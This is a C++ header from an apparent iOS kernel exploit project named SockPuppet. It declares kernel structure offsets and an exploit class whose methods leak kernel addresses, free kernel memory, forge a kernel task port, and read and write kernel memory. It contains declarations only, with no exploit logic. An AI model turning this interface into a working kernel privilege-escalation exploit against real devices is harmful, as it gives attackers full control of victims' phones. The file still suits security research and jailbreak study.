//
//  SockPuppet.hpp
//
//  Created by Umang Raghuvanshi on 02/08/19.
//  Copyright Â© 2019 Umang Raghuvanshi. All rights reserved. Licensed under the
//  BSD 3-clause license.

// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
// 1. Redistributions of source code must retain the above copyright notice,
// this list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above copyright notice,
// this list of conditions and the following disclaimer in the documentation
// and/or other materials provided with the distribution.
// 3. Neither the name of the copyright holder nor the names of its contributors
// may be used to endorse or promote products derived from this software without
// specific prior written permission. THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT
// HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
// INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
// COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
// INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
// LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA,
// OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
// LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
// NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
// EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

#ifndef SockPuppet_hpp
#define SockPuppet_hpp

extern "C" {
#include <netinet/in.h>
#include <sys/socket.h>
#include <mach/mach_types.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#import "offsets.h"
#import "SockPuppetStructures.h"
}

#include <memory>
#import <string>

class HostInfo {
public:
    int integerVersion() const {
        return 124;
    };

    const std::string buildID() const {
        return "buildID";
    }
};

void info(const char *format, ...);
void debug(const char *format, ...);

class Versions {
public:
    static const int k12_0 = 120;
    static const int k12_3 = 123;
    static const int k12_4 = 124;
};

class StructureOffset {
public:
    static const enum kernel_offset Proc_PPID = KSTRUCT_OFFSET_PROC_PID;
    static const enum kernel_offset Task_BSDInfo = KSTRUCT_OFFSET_TASK_BSD_INFO;
    static const enum kernel_offset Proc_PFD = KSTRUCT_OFFSET_PROC_P_FD;
    static const enum kernel_offset FileGlob_FGData = KSTRUCT_OFFSET_FILEGLOB_FG_DATA;
    static const enum kernel_offset FGData_PipeBuffer = KSTRUCT_OFFSET_PIPE_BUFFER;

    static const enum kernel_offset IPCPort_IPKObject = KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT;
};

static const enum kernel_offset FileDescriptor_FDOfiles = KSTRUCT_OFFSET_FILEDESC_FD_OFILES;
static const enum kernel_offset FileProc_FGlob = KSTRUCT_OFFSET_FILEPROC_F_FGLOB;
static const enum kernel_offset Task_ITKSpace = KSTRUCT_OFFSET_TASK_ITK_SPACE;
static const enum kernel_offset IPCSpace_ISTable = KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE;
static const enum kernel_offset IPCSpace_ISTableSize = KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE_SIZE;

static const enum kernel_offset IPCPort_IPReceiver = KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER;

static const enum kernel_offset Task_VMMap = KSTRUCT_OFFSET_TASK_VM_MAP;
static const enum kernel_offset Task_Prev = KSTRUCT_OFFSET_TASK_PREV;

static const enum kernel_offset Task_ITKSelf = KSTRUCT_OFFSET_TASK_ITK_SELF;
static const enum kernel_offset IPCPort_IPKObject = KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT;

class Parameters {
public:
    int get(enum kernel_offset offset) const {
        return koffset(offset);
    }
};

class KernelExploit {
public:
    const HostInfo &m_hostInfo;
    const Parameters &m_parameters;
    int m_progress;
    KernelExploit(const HostInfo &hostInfo, const Parameters &parameters) : m_hostInfo(hostInfo), m_parameters(parameters) {
        m_progress = 0;
    }
};

namespace Exploits {
    class SockPuppet : KernelExploit {
    private:
        uint64_t leakPortAddress(mach_port_t portname);
        int socketWithDanglingOptions;
        uint64_t currentTaskAddr;
        std::unique_ptr<uint8_t[]> leak20AndFree(uint64_t address, bool free = false);
        uint64_t earlyRead64(uint64_t address);
        uint64_t leakPipeBufferAddress(int fd, uint64_t *bufferptr = 0);
        mach_port_t kernelTaskPort = MACH_PORT_NULL;

    public:
        SockPuppet(const HostInfo &hostInfo, const Parameters &parameters);
        bool isCompatible() const;
        bool canRerun() const;
        bool canReturnFakeTFP0() const;
        bool run();
        mach_port_t getFakeKernelTaskPort();

        size_t readKernelMemory(uint64_t address, uint8_t *buffer, size_t bufferSize);
        size_t writeKernelMemory(uint64_t address, uint8_t *data, size_t dataSize);
        uint64_t leakImagePointer();
        uint64_t getCurrentTaskAddress();
    };
}  // namespace Exploits

#endif /* SockPuppet_hpp */
